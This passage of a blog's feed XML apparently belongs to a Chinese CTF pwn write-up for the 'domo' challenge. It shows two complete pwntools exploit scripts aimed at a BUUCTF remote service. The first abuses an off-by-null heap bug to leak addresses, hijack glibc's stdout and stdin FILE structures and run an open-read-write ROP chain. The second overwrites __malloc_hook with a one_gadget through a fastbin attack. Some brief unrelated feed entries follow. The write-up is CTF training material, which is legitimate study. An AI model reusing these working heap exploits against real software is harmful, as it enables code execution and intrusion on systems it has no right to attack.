class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>, <span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak heap----------------</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"\x10"</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">heap_addr=u64 (p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">free (<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------leak libc----------------</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"A"</span>* <span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'b'</span>* <span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'c'</span> *<span class="number">0x68</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'d'</span> *<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'e'</span>*<span class="number">56</span>+p64(<span class="number">0x71</span>)+<span class="string">'e'</span>*<span class="number">176</span>+ p64(<span class="number">0x100</span>) +p64(<span class="number">0x21</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,p64 (<span class="number">0x21</span>) *<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x11"</span>*<span class="number">0x60</span>+p64(<span class="number">0x300</span>)) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'flag'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+<span class="string">'\x22'</span>*<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc.address=main_arena<span class="number">-0x3c4b78</span></span><br><span class="line">environ_addr=libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">stdout_hook=libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">stdin_hook=libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line">_IO_file_jumps=libc.symbols[<span class="string">"_IO_file_jumps"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak stack_addr--------------</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload+=p64(stdout_hook<span class="number">-0x43</span>)</span><br><span class="line">add(<span class="number">0x118</span>,payload) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+p64(_IO_file_jumps)+p64(<span class="number">0xfbad1800</span>)+p64(stdout_hook+<span class="number">131</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(environ_addr)+p64(environ_addr+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"len="</span>,hex(len(payload))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,payload) <span class="comment">#6</span></span><br><span class="line">stack_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xf2</span></span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------Write orw to stack----------</span></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0xf8</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)) <span class="comment">#4</span></span><br><span class="line">free2(<span class="number">0</span>)</span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)) <span class="comment">#7</span></span><br><span class="line">free2(<span class="number">7</span>)</span><br><span class="line">add2(<span class="number">0x108</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)+p64(stdin_hook<span class="number">-0x28</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.search(asm(<span class="string">"pop rdi\nret"</span>)).next()</span><br><span class="line">pop_rsi_ret=libc.search(asm(<span class="string">"pop rsi\nret"</span>)).next()</span><br><span class="line">pop_rdx_ret=libc.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br><span class="line"></span><br><span class="line">open_addr=libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">read_addr=libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">puts_addr=libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">orw=p64(pop_rdi_ret)+p64(heap_addr+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_file_jumps"</span>])+p64(<span class="number">0</span>)+ p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(stack_addr)+p64(stack_addr+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">edit(stdin_hook<span class="number">-0x20</span>,<span class="string">'\x7f'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,payload)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5\n"</span>+orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><p>还有另一种非预期思路，打<code>malloc_hook</code>,然后利用<code>scanf</code>函数输入过多字符，会调用<code>malloc</code>申请内存</p><p>这里<code>onegadget</code>都失效了，用<code>realloc</code>调整偏移即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + malloc_hook-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">malloc_hook_payload2=<span class="string">'b'</span>*<span class="number">0xb</span>+p64(one[<span class="number">2</span>]+libc.address)+p64(sym(<span class="string">"realloc"</span>)+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,malloc_hook_payload2) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg(0x12D7)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">'0'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;domo&lt;/h2&gt;&lt;p&gt;一道 domo日了一天，最后还是做出来，还是很高兴的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;off-by-null&lt;/code&gt;漏洞，e
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-09-01T10:49:40.807Z</updated>
    
    <content type="html"><![CDATA[<p>咕咕咕，留个坑。等有时间再写</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;咕咕咕，留个坑。等有时间再写&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19g/BtItW99O3RzKLxvtd+RudOUTI7KV3g= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-25T03:32:08.776Z</updated>
    
